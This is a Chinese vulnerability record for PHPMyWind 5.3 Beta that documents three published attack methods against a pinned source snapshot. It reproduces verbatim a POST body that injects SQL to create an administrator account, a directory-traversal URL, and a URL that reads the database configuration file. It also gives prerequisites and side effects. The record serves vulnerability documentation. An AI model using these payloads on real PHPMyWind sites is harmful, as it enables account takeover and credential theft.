---
schema_version: "1"
id: "VW-20261005-FR369"
title: "PHPMyWind 5.3 Beta 前台会员 SQL 输入与后台目录、文件读取"
product: "PHPMyWind 会员完善资料与后台文件管理"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "source-claimed"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: "WooYun-2015-0117008"
identifier_role: "unknown"
identifier_status: "unknown"
version: "原作者称5.3；本次静态对应到第三方镜像提交74e42356f6deb8d6d8450b49f3b5b78ccbb95cff自标识的5.3 Beta，不推定所有5.3发行包"
fixed_version: "unknown"
prerequisites: "会员路径需会员功能、正常前台登录及可加载的OAuth辅助环境；后台路径需管理员会话和对应模块权限；文件访问受进程权限及环境约束"
side_effects: "会员SQL原例会新增管理员记录并改变数据库，完善资料分支会改发Cookie；后台访问可能记录管理操作并显示目录或配置文件内容；均未执行"
source: "l3m0n原作者文章；gaozhifeng/PHPMyWind第三方镜像静态对应；FrameVul条目369"
source_status: "recorded"
source_url: "https://www.cnblogs.com/iamstudy/articles/phpmywind_v5-3.html"
archive_commit: "74e42356f6deb8d6d8450b49f3b5b78ccbb95cff"
verification_source: "https://github.com/gaozhifeng/PHPMyWind/blob/74e42356f6deb8d6d8450b49f3b5b78ccbb95cff/include/common.inc.php#L92-L93"
---

# PHPMyWind 5.3 Beta 前台会员 SQL 输入与后台目录、文件读取

## 资料范围和来源

[原作者l3m0n的文章](https://www.cnblogs.com/iamstudy/articles/phpmywind_v5-3.html)发布于2016-06-17，描述三种方法，并将版本写作5.3。本文保留该文的具体输入与账户测试值，以固定源码补充版本及鉴权前提；不把三个方法自动组合成新的利用链。

FrameVul原链接所指[CSDN页面](https://blog.csdn.net/dengzhasong7076/article/details/102139691)尚未恢复；本篇是独立来源的同主题补充，未确认原CSDN全文对应。

固定核对对象是第三方镜像gaozhifeng/PHPMyWind，提交为74e42356f6deb8d6d8450b49f3b5b78ccbb95cff。[更新说明首节](https://github.com/gaozhifeng/PHPMyWind/blob/74e42356f6deb8d6d8450b49f3b5b78ccbb95cff/%E6%9B%B4%E6%96%B0%E8%AF%B4%E6%98%8E.txt#L1-L10)与[公共入口的版本常量](https://github.com/gaozhifeng/PHPMyWind/blob/74e42356f6deb8d6d8450b49f3b5b78ccbb95cff/include/common.inc.php#L92-L93)分别写明5.3 Beta、2015-09-13及20150913221909。没有官方包校验和或字节同源证明，因此本次静态对应只覆盖这个明确快照。

下列10.211.55.3地址、目录名、用户名、密码、邮箱和SQL值均为原作者公开示例值，按原文保存。没有把它们替换成新目标，也没有访问这些地址。

## 一、前台会员完善资料路径

### 前提与代码对应

[member.php登录检查](https://github.com/gaozhifeng/PHPMyWind/blob/74e42356f6deb8d6d8450b49f3b5b78ccbb95cff/member.php#L23-L91)要求会员功能启用，perfect动作具有正常前台登录状态，账号存在且未被禁用。

该快照由[公共入口](https://github.com/gaozhifeng/PHPMyWind/blob/74e42356f6deb8d6d8450b49f3b5b78ccbb95cff/include/common.inc.php#L20-L58)把GET/POST参数绑定为变量。[perfect分支](https://github.com/gaozhifeng/PHPMyWind/blob/74e42356f6deb8d6d8450b49f3b5b78ccbb95cff/member.php#L861-L954)只有在QQ或微博登录检查成立时才重新赋值sql，随后调用ExecNoneQuery(sql)。原作者描述对应的是两个检查均不成立的情形。

辅助代码还需能正常加载：该镜像默认会员与OAuth开关均为Y，[OAuth核心入口](https://github.com/gaozhifeng/PHPMyWind/blob/74e42356f6deb8d6d8450b49f3b5b78ccbb95cff/data/api/oauth/system/core.php#L12-L25)检查OAuth开关及PHP cURL。用户名、密码和邮箱验证以及数据库层检查仍然存在，不能把下列原例概括成所有SQL输入均会执行。

### 原文手工步骤与原始请求体

1. 按网站前台注册流程注册原例账户：用户名testaa，密码123456，然后登录
2. 保持该登录状态，访问原文地址：

```text
http://10.211.55.3/phpmywind/PHPMyWind_5.3/member.php?a=perfect
```

3. 向同一地址发送POST，原文给出的请求体如下。原文没有提供这个5.3示例的实际Cookie字符串，这里沿用前述登录状态，不从其他版本实验中移植Cookie，也不补造完整HTTP报文

```text
username=123123a123x&password=a123123123&repassword=a123123123&email=a12312@qq.com&sql=insert into pmw_admin (`username`,`password`,`levelname`) values((1231235),0x6333323834643066393436303664653166643261663137326162613135626633,1)
```

### 原文声明的结果与限制

原作者声明该示例会新增管理员账户1231235，密码为admin，并特别说明示例包含levelname、密码采用两次MD5后转hex。本文保留这些既有值，不重新计算、修订或生成另一段SQL。

固定源码支持该参数到数据库调用的静态对应；本次没有执行数据库语句或再次登录验证。该请求具有新增管理员记录的副作用，不能标作只读检测。perfect分支随后还会重新发放会员Cookie。

已保存的文章解析文本中，第一节标作member.php的代码块与目录遍历节重复；本次未独立核对原网页HTML，不断定作者原页必然贴错。该文本保持原样，以上源码链接独立给出对应分支。

## 二、后台目录遍历

### 前提与代码对应

[upload_filemgr_dir.php入口](https://github.com/gaozhifeng/PHPMyWind/blob/74e42356f6deb8d6d8450b49f3b5b78ccbb95cff/admin/upload_filemgr_dir.php#L1-L34)先加载后台配置，再要求upload_filemgr_sql模块权限。需要有效后台管理员会话；非超级管理员还须具备对应模块授权，详见[IsModelPriv](https://github.com/gaozhifeng/PHPMyWind/blob/74e42356f6deb8d6d8450b49f3b5b78ccbb95cff/admin/inc/admin.func.php#L1271-L1311)。

该文件对dirname执行一次字符串替换，再拼接目录并调用opendir。原文指出替换顺序和非循环处理使其示例仍可进入上级目录。目录读取范围受PHP进程权限和环境约束。

### 原文手工步骤与原始URL

1. 使用已有授权后台账号登录，并确认可使用上传文件管理模块
2. 在同一后台登录状态下访问原文URL：

```text
http://10.211.55.3/phpmywind/PHPMyWind_5.3/admin/upload_filemgr_dir.php?dirname=uploads/...././/...././/
```

3. 原文预期是目录遍历；对应页面以目录列表呈现处理后的路径。应核对其是否进入uploads之外的上级目录，不能仅以HTTP200判断成功

这里的输入来自原作者，未生成额外层级或新变体。本文没有实际目录列表、截图验证或访问结果，不虚构返回文件名。源码对应只说明目录处理和显示逻辑。

## 三、后台文件读取

### 前提与代码对应

[editfile_update.php](https://github.com/gaozhifeng/PHPMyWind/blob/74e42356f6deb8d6d8450b49f3b5b78ccbb95cff/admin/editfile_update.php#L1-L73)要求有效后台会话及editfile模块权限。后台配置把cfg_editfile设为N，但这一开关只在action=update的写入分支中检查；后面的显示/读取分支不能据此视为同样受保护。

需要读取的文件存在且PHP进程可读，并具备代码使用的编码转换等环境条件。下面的原始请求不指定action=update，不是文件写入步骤。

### 原文手工步骤与原始URL

1. 使用已有授权后台账号登录，并具备editfile模块权限
2. 在同一登录状态下访问原文URL：

```text
http://10.211.55.3/phpmywind/PHPMyWind_5.3/admin/editfile_update.php?filename=/include/conn.inc.php
```

3. 原作者声明可读取数据库配置文件。固定源码在文件存在时读取其内容，并在页面的编辑文本区域显示。应以对应配置内容实际返回为观察点，不把单纯页面打开或HTTP200当成读取成功

原文未提供该配置文件的实际内容，本文不补造任何数据库凭据。先前5.2实验中的系统文件读取示例，也不作为5.3运行成功证据。

## 修复状态、副作用与核验边界

- 三项准确修复版本均为unknown。后续5.5更新说明中“移除后台模板编辑”等文字，不能证明会员SQL路径、目录遍历和文件读取全部修复
- 会员SQL原例会改变数据库并新增管理员记录；后台两项可能记录管理操作，读取的目录和配置内容可能敏感。这些方法不能被统称为无副作用
- 静态阅读只覆盖已列出的入口、请求变量处理、版本常量、直接权限判断、OAuth登录状态判断及数据库执行/过滤方法。没有递归审计全部OAuth客户端SDK、安装程序、数据库内容或所有PHP文件
- 全部步骤为原公开资料及静态源码对应。本次没有运行PHP、PoC、SQL，未导入或安装工具，也没有请求示例目标；没有做完整程序安全认证
- 原有测试值、URL和代码材料保持原样。独立说明均与来源材料分开，不静默修正源文，也不读取或并入其他暂停问题

## 已读来源

1. [l3m0n原作者文章](https://www.cnblogs.com/iamstudy/articles/phpmywind_v5-3.html)：版本声明、三个方法的原始输入和文字结果
2. [gaozhifeng/PHPMyWind固定提交](https://github.com/gaozhifeng/PHPMyWind/tree/74e42356f6deb8d6d8450b49f3b5b78ccbb95cff)：第三方镜像版本与直接代码对应
3. [固定MySQLi执行方法](https://github.com/gaozhifeng/PHPMyWind/blob/74e42356f6deb8d6d8450b49f3b5b78ccbb95cff/include/mysqli.class.php#L210-L244)及[其SQL检查](https://github.com/gaozhifeng/PHPMyWind/blob/74e42356f6deb8d6d8450b49f3b5b78ccbb95cff/include/mysqli.class.php#L523-L626)：限定会员原例的静态处理路径，不构成独立运行验证
